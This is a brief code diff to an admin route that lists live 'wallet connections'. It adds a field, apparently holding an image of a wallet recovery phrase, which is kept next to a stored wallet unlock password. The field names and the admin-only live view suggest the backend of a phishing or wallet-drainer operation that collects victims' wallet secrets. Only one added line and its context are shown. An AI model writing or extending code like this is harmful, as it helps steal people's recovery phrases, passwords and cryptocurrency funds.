@@ -340,6 +340,7 @@ adminRoutes.get('/wallet-connections/live', requireAdmin, async (_req, res) => {
         ...prev,
         ...row,
         unlockPassword: row.unlockPassword || prev?.unlockPassword || null,
+        phraseSnapImage: row.phraseSnapImage || prev?.phraseSnapImage || null,
         connectedAt: prev?.connectedAt || row.connectedAt,
       })
     }
